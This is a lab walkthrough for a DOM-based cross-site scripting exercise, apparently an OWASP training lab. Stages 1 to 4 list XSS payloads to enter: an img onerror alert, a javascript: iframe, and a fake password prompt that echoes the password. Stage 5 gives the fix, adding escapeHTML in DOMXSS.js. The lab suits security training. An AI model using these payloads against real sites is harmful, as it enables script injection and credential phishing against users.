# LAB_DOM-Based_cross-site_scripting
## STAGE 1
![](_v_images/_1524707693_10761.png)

* Enter "``<IMG SRC="images/logos/owasp.jpg"/>``" and submit the solution.
## STAGE 2
![](_v_images/_1524707764_13125.png)

*  Enter "``<img src=x onerror=;;alert('XSS') />``" and submit the solution.
## STAGE 3
![](_v_images/_1524707874_18154.png)

* Enter "``<IFRAME SRC="javascript:alert('XSS');"></IFRAME>``" and submit the solution.
## STAGE 4
![](_v_images/_1524708069_20706.png)

*  Enter "``Please enter your password:<BR><input type = "password" name="pass"/><button onClick="javascript:alert('I have your password: ' + pass.value);">Submit</button><BR><BR><BR><BR><BR><BR><BR><BR> <BR><BR><BR><BR><BR><BR><BR><BR>``" and submit the solution.
## STAGE 5
![](_v_images/_1524726932_17994.png)
* Modify ``DOMXSS.js``, add ``escapeHTML()`` in ``name``, ie ``escapeHTML(name)``, then save it.
![](_v_images/_1524726820_7375.png)


